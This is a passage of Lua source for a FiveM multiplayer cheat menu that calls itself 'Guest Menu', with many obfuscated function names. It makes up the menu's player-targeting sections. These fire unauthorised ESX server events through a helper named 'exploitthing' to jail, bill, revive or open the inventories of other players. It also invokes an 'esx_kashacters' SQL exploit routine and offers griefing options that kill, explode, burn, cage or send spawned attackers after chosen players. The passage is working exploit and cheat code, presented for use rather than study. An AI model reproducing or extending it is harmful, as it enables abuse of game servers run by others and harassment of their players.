                    I.functions.aPO.propBlock(I.menuTables.trollsPropBlock.selected)
                elseif I.checkBox("~Y~Put all cars in the sky", I.OptionConfig.aPOFlyingCars) then
                    I.OptionConfig.aPOFlyingCars = not I.OptionConfig.aPOFlyingCars
                elseif I.checkBox("~Y~Freeze everyone", I.OptionConfig.aPOFreeze) then
                    I.OptionConfig.aPOFreeze = not I.OptionConfig.aPOFreeze
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("allPlayersOptionsTriggers") then
                if I.button("Jail", "~g~ESX") then
                    I.functions.aPO.jail()
                elseif I.button("Un-Jail", "~g~ESX") then
                    I.functions.aPO.unJail()
                elseif I.button("Community Service", "~g~ESX") then
                    I.functions.aPO.a0c3c7c65448d332b391432b870632()
                elseif I.button("Spawn Owned Vehicles", "~g~ESX") then
                    for fO = 0, #I.natives.GetActivePlayers() do
                        I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c(
                            "blista",
                            fO,
                            I.NewFunction.a1fa3be3614abf8c650e659bab68d0f2(3) ..
                                " " .. I.NewFunction.a47fd66c141b06eb90c77c8cfb1dd3cb(4)
                        )
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selectedPlayerOptions") then
                I.SubSettingTitle(
                    "selectedPlayerOptions",
                    "~b~[" ..
                        GetPlayerServerId(aT) ..
                            "]~m~ " .. GetPlayerName(aT) .. I.NewFunction.posfazeazedanada(GetPlayerPed(currentPlayer))
                )
                if I.menuButton("Weapons", "selectedPlayerOptionsWeapon", ">") then
                elseif I.menuButton("Teleport Options", "teleportplayer", ">") then
                elseif I.menuButton("Troll", "selectedPlayerOptionsTroll", ">") then
                elseif I.menuButton("Triggers", "selectedPlayerOptionsTriggers", ">") then
                elseif
                    I.button(
                        "Spectate",
                        I.OptionConfig.sPOIsSpectating and
                            "Spectating: [" .. GetPlayerServerId(I.OptionConfig.spectatedPlayer) .. "]" or
                            "Spectating: [-1]"
                    )
                 then
                    I.OptionConfig.spectatedPlayer = aT
                    I.functions.sPO.ed1ac970599f35651bc8d0f9c493becd(I.OptionConfig.spectatedPlayer)
                elseif I.button("Heal", "~o~[Risky]") then
                    I.natives.adc12da2eac5ceb7b3e53abdbb48(GetPlayerPed(aT), 200)
                    CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(aT)))
                elseif I.button("Refill armour", "~o~[Risky]") then
                    I.natives.e1281c561cf4fcae7c62d471d8(GetPlayerPed(aT), 200)
                    CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(aT)))
                    model = GetEntityModel(GetPlayerPed(aT))
                    SetPlayerModel(PlayerId(), model)
                    d.Main.Wait(100)
                    ClonePedToTarget(GetPlayerPed(aT), PlayerPedId())
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("teleportplayer") then
                if I.button("Teleport to him", "~o~[Risky]") then
                    I.functions.sPO.teleportToPlayer(aT)
                elseif I.button("Teleport in car", "~o~[Risky]") then
                    I.functions.sPO.teleportIntoVehicle(GetPlayerPed(aT))
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selectedPlayerOptionsWeapon") then
                if I.button("Delete weapons", "~o~[Risky]") then
                    I.NewFunction.fhdfsqodjfgsh(GetPlayerPed(aT))
                    RemoveAllPedWeapons(GetPlayerPed(aT), true)
                    RemoveAllPedWeapons(GetPlayerPed(aT), false)
                elseif I.button("Get ammo", "~o~[Risky]") then
                    for b7 = 1, #I.FunctionTables.weaponsModels do
                        AddAmmoToPed(GetPlayerPed(aT), GetHashKey(I.FunctionTables.weaponsModels[b7]), 250)
                    end
                end
                for b7 = 1, #I.FunctionTables.weaponsModels do
                    if I.button(I.FunctionTables.weaponsModels[b7]) then
                        if I.OptionConfig.weapSpawnAsPickup then
                            CreatePickup(
                                GetHashKey("PICKUP_" .. I.FunctionTables.weaponsModels[b7]),
                                GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
                            )
                        else
                            I.natives.d6900ec9e918eb1426be32868e2b0(
                                GetPlayerPed(aT),
                                GetHashKey(I.FunctionTables.weaponsModels[b7]),
                                250,
                                false,
                                true
                            )
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selectedPlayerOptionsTriggers") then
                if I.button("Open Inventory", "~g~ESX") then
                    I.exploitthing(
                        false,
                        false,
                        "esx_inventoryhud:openPlayerInventory",
                        GetPlayerServerId(aT),
                        GetPlayerName(aT)
                    )
                elseif I.button("Jail", "~g~ESX") then
                    local time = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of time", "5391", 12)
                    if I.functions.game.isNullOrEmpty(time) then
                        time = 5391
                    end
                    I.functions.sPO.jailTheFucker(GetPlayerServerId(aT), time)
                elseif I.button("Un-Jail", "~g~ESX") then
                    I.functions.sPO.unJailTheFucker(GetPlayerServerId(aT))
                elseif I.button("Send Bill", "~g~ESX") then
                    local fP = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount", "", 10)
                    local fQ = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter the name of the bill", "", 10)
                    if not I.functions.game.isNullOrEmpty(fP) and not I.functions.game.isNullOrEmpty(fQ) then
                        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_billing") then
                            I.exploitthing(
                                false,
                                true,
                                "esx_billing:sendBill",
                                GetPlayerServerId(aT),
                                "Guest",
                                fQ,
                                fP
                            )
                            I.exploitthing(
                                false,
                                true,
                                "esx_billing:sendBill",
                                GetPlayerServerId(aT),
                                "Guest",
                                fQ,
                                fP
                            )
                        else
                            Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
                        end
                    end
                elseif I.button("Spawn Owned Vehicle", "~g~ESX") then
                    local eR = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Spawn Name", "", 20)
                    local eS = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Plate Number", "", 8)
                    I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c(eR, aT, eS)
                elseif I.button("Revive", "~g~ESX") then
                    I.exploitthing(false, true, "esx_ambulancejob:revive", GetPlayerServerId(aT))
                    I.exploitthing(false, false, "esx_ambulancejob:revive", GetPlayerServerId(aT))
                    if I.Guestdata.ESX ~= nil then
                        I.Guestdata.ESX.TriggerServerCallback(
                            "esx_society:getOnlinePlayers",
                            function(fR)
                                local fS = nil
                                for b7 = 1, #fR do
                                    if fR[b7].name == GetPlayerName(aT) then
                                        fS = fR[b7]
                                    end
                                end
                                if fS then
                                    o(I.menuTables.serverKashactersSQL.actual)
                                    I.functions.exploits.esx_kashacters(
                                        fS.identifier,
                                        "clean",
                                        I.menuTables.serverKashactersSQL.actual
                                    )
                                else
                                    o("issue getting xPlayer")
                                end
                            end
                        )
                    else
                        o("issue getting ESX")
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("selectedPlayerOptionsTroll") then
                if I.menuButton("Attach Options", "attachoptions", ">") then
                elseif I.menuButton("Following vehicle options", "followingoptions", ">") then
                elseif I.button("~p~			    	    LITTLE TROLLS") then
                elseif I.button("Spawn sultan on player", "~r~[Risky]") then
                    ac7027e349e80aef48819f0ee25ef9()
                elseif I.button("Stop animations", "~r~[Risky]") then
                    I.natives.clearPedTasksImmediately(GetPlayerPed(aT))
                elseif I.button("Kick of vehicle", "~r~[Risky]") then
                    I.natives.clearPedTasksImmediately(GetPlayerPed(aT))
                elseif I.button("Burn player ~w~", "~g~[Safe]") then
                    local x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetEntityCoords(GetPlayerPed(aT))
                    )
                    for b7 = 0, 5 do
                        StartScriptFire(x, y, z - 0.99, 25, true)
                    end
                elseif
                    I.comboBox(
                        "Shoot ~o~[Risky]",
                        {"Taze", "Pistol", "AK"},
                        I.OptionConfig.sPOShootAtOptionsCurrent,
                        I.OptionConfig.sPOShootAtOptionsSelected,
                        function(dI, dJ)
                            I.OptionConfig.sPOShootAtOptionsCurrent = dI
                            I.OptionConfig.sPOShootAtOptionsSelected = dI
                        end
                    )
                 then
                    if I.OptionConfig.sPOShootAtOptionsSelected == 1 then
                        I.functions.sPO.shootAt(GetPlayerPed(aT), "WEAPON_STUNGUN")
                    elseif I.OptionConfig.sPOShootAtOptionsSelected == 2 then
                        I.functions.sPO.shootAt(GetPlayerPed(aT), "WEAPON_PISTOL")
                    elseif I.OptionConfig.sPOShootAtOptionsSelected == 3 then
                        I.functions.sPO.shootAt(GetPlayerPed(aT), "WEAPON_ASSAULTRIFLE")
                    end
                elseif
                    I.comboBox(
                        "Spawn Props",
                        I.comboBoxes[4]._words,
                        I.comboBoxes[4]._current,
                        I.comboBoxes[4]._selected,
                        function(dI, dJ)
                            I.comboBoxes[4]._current = dI
                            I.comboBoxes[4]._selected = dI
                        end
                    )
                 then
                    if type(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) == "table" then
                        for aM, bb in pairs(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) do
                            I.functions.sPO.a82067704cc6922707d00ddbe0451(
                                GetPlayerPed(aT),
                                I.comboBoxes[4]._actual[I.comboBoxes[4]._selected][aM]
                            )
                        end
                    else
                        I.functions.sPO.a82067704cc6922707d00ddbe0451(
                            GetPlayerPed(aT),
                            I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]
                        )
                    end
                elseif
                    I.button(
                        "Fling ~r~[Risky]",
                        I.OptionConfig.sPOFlingPlayer and
                            "Target: [" .. GetPlayerServerId(I.OptionConfig.sPOFlingedPlayer) .. "]" or
                            "Target: [-1]"
                    )
                 then
                    I.OptionConfig.sPOFlingPlayer = not I.OptionConfig.sPOFlingPlayer
                    I.OptionConfig.sPOFlingedPlayer = aT
                elseif I.button("~p~			    	    BIG TROLLS") then
                elseif I.button("Explode his car", "~g~[Safe]") then
                    local fT = GetVehiclePedIsIn(GetPlayerPed(aT), false)
                    I.natives.clearPedTasksImmediately(GetPlayerPed(aT))
                    I.functions.sPO.rapeVehicle(fT)
                elseif I.button("Spawn ennemies", "~r~[Risky]") then
                    I.functions.sPO.b58cce487a539921a8cf163e4972aab(GetPlayerPed(aT), "a_m_y_skater_01")
                elseif I.button("Cage", "~r~[Risky]") then
                    I.functions.sPO.cagePlayer(GetPlayerPed(aT))
                elseif I.button("Attack by plane", "~r~[Risky]") then
                    local K = GetPlayerPed(aT)
                    local coords = GetEntityCoords(K)
                    while not HasModelLoaded(GetHashKey("cargoplane")) and not killmenu do
                        RequestModel(GetHashKey("cargoplane"))
                        Wait(1)
                    end
                elseif I.button("Ram Player") then
                    local veh = "futo"
                    local ck = PlayerPedId(selectedPlayerId)
                    local bH = GetEntityCoords(GetPlayerPed(selectedPlayerId))
                    local fU = GetEntityForwardX(GetPlayerPed(selectedPlayerId))
                    local fV = GetEntityForwardY(GetPlayerPed(selectedPlayerId))
                    local fW = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayerId), 0, -0.2, 0)
                    local i = nil
                    RequestModel(veh)
                    RequestModel("s_f_y_bartender_01")
                    while not HasModelLoaded(veh) and not HasModelLoaded("s_f_y_bartender_01") do
                        RequestModel("s_f_y_bartender_01")
                        d.Main.GuestWait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        local i =
                            e087206cc908106f5b9548005fa39fd(veh, fW.x, fW.y, fW.z, GetEntityHeading(ck), true, true)
                        a5a42faa7cf2d2e6ec9530df349f5a7(i, false, true)
                        if DoesEntityExist(i) then
                            NetworkRequestControlOfEntity(i)
                            SetVehicleDoorsLocked(i, 4)
                            RequestModel("s_f_y_bartender_01")
                            d.Main.GuestWait(50)
                            if HasModelLoaded("s_f_y_bartender_01") then
                                d.Main.GuestWait(50)
                                SetVehicleForwardSpeed(i, 120.0)
                            end
                        end
                    end
                elseif I.button("Explode", "~o~[Risky]") then
                    local fX = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z - 2, 13, 5.0, false, false, 0.0)
                elseif I.button("Silent Kill Player", "~o~[Risky]") then
                    local fX = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 26, FLT_MAX, false, true, 0.0)
                elseif I.button("Fire Player", "~o~[Risky]") then
                    local fX = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 14, 5.0, false, false, 0.0)
                elseif I.button("Attack by terrorist", "~r~[Risky]") then
                    local ck = GetPlayerPed(SelectedPlayer)
                    local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    RequestModel("ig_hunter")
                    d.Main.GuestWait(50)
                    local K = CreatePed(21, GetHashKey("ig_hunter"), bH.x, bH.y, bH.z, true, true)
                    if DoesEntityExist(K) then
                        d6900ec9e918eb1426be32868e2b0(K, GetHashKey("WEAPON_RPG"), 999, false, true)
                        SetPedAmmo(K, GetHashKey("WEAPON_RPG"), 999)
                        TaskCombatPed(K, ck, 0, 16)
                        a5a42faa7cf2d2e6ec9530df349f5a7(K, false, true)
                        SetPedKeepTask(K, true)
                    end
                elseif I.button("Attack by SWAT", "~r~[Risky]") then
                    SWATTeamPullUp(aT)
                elseif I.button("Hydrant Player") then
                    d.Main.GuestInv(
                        0xE3AD2BDBAEE269AC,
                        GetEntityCoords(
                            d.Main.GuestInv(
                                0x43A66C31C68491C0,
                                SelPlayer
                            )
                        ),
                        13,
                        100000.0,
                        true,
                        false,
                        100000.0
                    )
                elseif I.button("Molotov Player") then
                    d.Main.GuestInv(
                        0xE3AD2BDBAEE269AC,
                        GetEntityCoords(
                            d.Main.GuestInv(
                                0x43A66C31C68491C0,
                                SelPlayer
                            )
                        ),
                        3,
                        100000.0,
                        true,
                        false,
                        100000.0
                    )
                elseif I.button("Spam cars on player") then
                    local model = c9f328ef7b30553a6705e827855bd30c("Vehicle Name", "", 100)
                    local bN = GetHashKey(model)
                    if IsModelAVehicle(bN) then
                        RequestModelSync(bN)
                        for b7 = 0, 50 do
                            local coords = GetEntityCoords(GetPlayerPed(SelPlayer))
                            e087206cc908106f5b9548005fa39fd(bN, coords.x, coords.y, coords.z + 1, 0.0, true, true)
                        end
                    end
                elseif I.button("Explode ~r~[Risky]", "~r~[Risky]") then
                    local coords = GetEntityCoords(GetPlayerPed(aT))
                    I.natives.d5cb04ddaa81e3685adb07e123e0631(
                        coords.x + 1,
                        coords.y + 1,
                        coords.z + 1,
                        4,
                        100.0,
                        true,
                        false,
                        0.0
                    )
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("followingoptions") then
                if I.button("Police Follow Player") then
                    local veh = "Police"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 30,
                                bH.y - fV * 30,
                                bH.z + 1,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetPlayerPed(SelectedPlayer),
                                            -1,
                                            50.0,
                                            1082917029,
                                            7.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Police follow Vehicle") then
                    local veh = "Police"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 30,
                                bH.y - fV * 30,
                                bH.z + 1,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                            -1,
                                            50.0,
                                            1082917029,
                                            7.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Heli Follow Player") then
                    local veh = "Buzzard"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 30,
                                bH.y - fV * 30,
                                bH.z + 820,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetPlayerPed(SelectedPlayer),
                                            -1,
                                            50.0,
                                            1082917029,
                                            37.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Heli Follow Vehicle") then
                    local veh = "Buzzard"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 30,
                                bH.y - fV * 30,
                                bH.z + 820,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                            -1,
                                            50.0,
                                            1082917029,
                                            37.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Tank Follow Player") then
                    local veh = "Rhino"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 90,
                                bH.y - fV * 90,
                                bH.z + 1,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetPlayerPed(SelectedPlayer),
                                            -1,
                                            250.0,
                                            1082917029,
                                            7.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Tank Follow Vehicle") then
                    local veh = "Rhino"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 90,
                                bH.y - fV * 90,
                                bH.z + 1,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                            -1,
                                            7.5,
                                            1082917029,
                                            7.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("ClownGang Follow Vehicle") then
                    local veh = "Speedo2"
                    for b7 = 0, 0 do
                        local ck = PlayerPedId(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            Citizen.Wait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 100,
                                bH.y - fV * 100,
                                bH.z + 1,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, i, 0)
                                        TaskVehicleEscort(
                                            K,
                                            i,
                                            GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                            -1,
                                            7.5,
                                            1082917029,
                                            7.5,
                                            0,
                                            -1
                                        )
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                    end
                                end
                            end
                        end
                    end
                elseif I.button("Plane fly above him") then
                    local veh = "Shamal"
                    for b7 = 0, 0 do
                        local ck = GetPlayerPed(SelectedPlayer)
                        local bH = GetEntityCoords(GetPlayerPed(SelectedPlayer))
